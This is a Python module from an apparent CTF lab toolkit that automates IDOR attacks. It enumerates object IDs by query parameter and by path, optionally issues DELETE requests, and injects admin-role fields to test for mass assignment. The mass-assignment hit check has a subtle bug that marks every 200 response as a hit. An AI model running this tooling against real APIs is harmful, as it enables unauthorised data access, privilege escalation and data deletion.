"""
modules/idor.py — IDOR / Parameter Tampering / Object Enumeration.

Cobre:
- Enumeração de ID numérico (GET /api/user?id=1..N)
- Enumeração em path (GET /api/user/1..N)
- Mass assignment — tenta injetar campos privilegiados no body
"""

from __future__ import annotations

from rich.console import Console

from ctflab.core import http as H
from ctflab.core.session import Session
from ctflab.cli.menu import run_menu
from ctflab.cli.ui import ask, askctx, ask_int, ask_json_interactive, scan_table


# ── sinais de resposta interessante ──────────────────────────

_INTERESTING_KEYWORDS = [
    "admin", "root", "flag", "secret", "token", "password",
    "email", "role", "privilege", "enabled",
]


def _is_interesting(body: str, baseline_len: int = 0) -> tuple[bool, str]:
    """
    Retorna (True, motivo) se a resposta parecer interessante.
    Usa keywords e variação significativa de tamanho (Δsize).
    """
    bl = body.lower()
    for kw in _INTERESTING_KEYWORDS:
        if kw in bl:
            return True, f"keyword:{kw}"
    
    if baseline_len > 0:
        # variação de mais de 60 bytes em relação à baseline (erro/vazio)
        # costuma indicar que um objeto real foi retornado.
        if abs(len(body) - baseline_len) > 60:
            return True, f"Δsize:{len(body)-baseline_len:+d}"
            
    return False, ""


# ── handlers ──────────────────────────────────────────────────

from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

def _enum_query_param(s: Session, c: Console) -> None:
    """
    Enumeração via query param — ex: GET /api/user?id=1..N
    """
    path   = askctx(s, "path",       "path",           "/api/user")
    param  = askctx(s, "idor_param", "parâmetro de ID","id")
    start  = ask_int("ID inicial", 1)
    end    = ask_int("ID final",   20)
    method = ask("método (get/post)", "get").lower()

    # baseline com ID 0
    c.print("[dim]tirando baseline com ID=0...[/dim]")
    try:
        with H._make_client(s) as cl:
            bl_r    = cl.get(path, params={param: 0}) if method == "get" else cl.post(path, json={param: 0})
            baseline = len(bl_r.text)
    except Exception:
        baseline = 0

    table = scan_table(
        f"IDOR — {param} {start}..{end}",
        ["id", "status", "Δsize", "motivo", "resposta"],
    )

    hits = 0
    total = end - start + 1
    
    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), console=c) as prog:
        task = prog.add_task(f"explorando {param}", total=total)
        
        with H._make_client(s) as cl:
            for i in range(start, end + 1):
                try:
                    prog.update(task, description=f"testando {param}={i}", advance=1)
                    r = cl.get(path, params={param: i}) if method == "get" else cl.post(path, json={param: i})

                    code    = r.status_code
                    delta   = len(r.text) - baseline
                    hit, reason = _is_interesting(r.text, baseline)
                    snippet = r.text[:60].replace("\n", " ")

                    if code == 200:
                        style = "ok"
                    elif code in (403, 401):
                        style = "warn"
                    else:
                        style = "dim"

                    if hit or code == 200:
                        hits += 1
                        s.note(f"IDOR [{code}]: {param}={i} ({reason})")
                        table.add_row(
                            str(i),
                            f"[{style}]{code}[/{style}]",
                            f"{delta:+d}",
                            f"[ok]{reason}[/ok]" if reason else "-",
                            snippet,
                        )
                except Exception as exc:
                    table.add_row(str(i), "[fail]ERR[/fail]", "0", "exception", str(exc)[:40])

    c.print(table)
    c.print(f"\n[ok]{hits} ID(s) interessante(s)[/ok]")


def _enum_path(s: Session, c: Console) -> None:
    """
    Enumeração via path — ex: GET /api/user/1..N
    """
    base_path = askctx(s, "base_path", "path base (sem ID)", "/api/user")
    start     = ask_int("ID inicial", 1)
    end       = ask_int("ID final",   20)
    method    = ask("método (get/post/delete)", "get").lower()

    table = scan_table(
        f"IDOR path — {base_path}/ID",
        ["id", "status", "motivo", "resposta"],
    )

    hits = 0
    total = end - start + 1

    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(), console=c) as prog:
        task = prog.add_task("explorando path", total=total)
        
        with H._make_client(s) as cl:
            for i in range(start, end + 1):
                full = f"{base_path.rstrip('/')}/{i}"
                try:
                    prog.update(task, description=f"testando {full}", advance=1)
                    if method == "delete":
                        r = cl.request("DELETE", full)
                    elif method == "post":
                        r = cl.post(full, json={})
                    else:
                        r = cl.get(full)

                    code    = r.status_code
                    hit, reason = _is_interesting(r.text)
                    snippet = r.text[:55].replace("\n", " ")
                    style   = "ok" if code == 200 else ("warn" if code in (403, 401) else "dim")

                    if hit or code == 200:
                        hits += 1
                        s.note(f"IDOR path [{code}]: {full} ({reason})")
                        table.add_row(
                            str(i),
                            f"[{style}]{code}[/{style}]",
                            f"[ok]{reason}[/ok]" if reason else "-",
                            snippet,
                        )
                except Exception as exc:
                    table.add_row(str(i), "[fail]ERR[/fail]", "exception", str(exc)[:40])

    c.print(table)
    c.print(f"\n[ok]{hits} resposta(s) interessante(s)[/ok]")


def _mass_assignment(s: Session, c: Console) -> None:
    """
    Mass Assignment — injeção de campos privilegiados no body.

    Muitas APIs aceitam campos extras sem validar.
    Tenta adicionar role/admin/privilege a um payload normal.
    """
    path    = askctx(s, "path", "path", "/api/user/update")
    c.print("\n[dim]construa o payload base (campos normais que você já tem)[/dim]")
    base    = ask_json_interactive(c)
    if not base:
        return

    # campos extras privilegiados para tentar
    injections = [
        {"role": "admin"},
        {"role": "administrator"},
        {"admin": True},
        {"admin": 1},
        {"is_admin": True},
        {"is_admin": 1},
        {"privilege": "admin"},
        {"level": 0},
        {"group": "admin"},
        {"permissions": ["admin"]},
        {"verified": True},
        {"active": True},
    ]

    table = scan_table(
        "Mass Assignment",
        ["campo injetado", "status", "hit?", "resposta"],
    )

    hits = 0
    with H._make_client(s) as cl:
        for inj in injections:
            payload = {**base, **inj}
            try:
                r       = cl.post(path, json=payload)
                code    = r.status_code
                keyword = _is_interesting(r.text)
                hit     = code == 200 and bool(keyword)
                style   = "ok" if hit else ("warn" if code == 200 else "dim")
                hit_str = "[ok]sim[/ok]" if hit else "[fail]não[/fail]"
                snippet = r.text[:55].replace("\n", " ")

                if hit:
                    hits += 1
                    s.note(f"Mass assignment: {inj} → {snippet}")
            except Exception as exc:
                code, style, hit_str, snippet = 0, "fail", "-", str(exc)[:40]

            field_str = ", ".join(f"{k}={v}" for k, v in inj.items())
            table.add_row(field_str, f"[{style}]{code}[/{style}]", hit_str, snippet)

    c.print(table)
    if hits:
        c.print(f"\n[ok]{hits} campo(s) aceito(s) — possível Mass Assignment![/ok]")
    else:
        c.print("\n[dim]nenhum campo privilegiado aceito (ou sem sinal visível)[/dim]")


_OPTIONS = {
    "1": ("enumeração via query param (?id=N)",  _enum_query_param),
    "2": ("enumeração via path (/resource/N)",   _enum_path),
    "3": ("mass assignment (campos admin)",       _mass_assignment),
    "0": ("voltar",                               None),
}


def run(session: Session, console: Console) -> None:
    console.rule("[head]IDOR / PARAMETER TAMPERING[/head]")
    console.print(
        "[dim]Testa acesso a objetos de outros usuários variando IDs e injetando "
        "campos privilegiados no payload.[/dim]\n"
    )
    run_menu("IDOR", _OPTIONS, session, console)
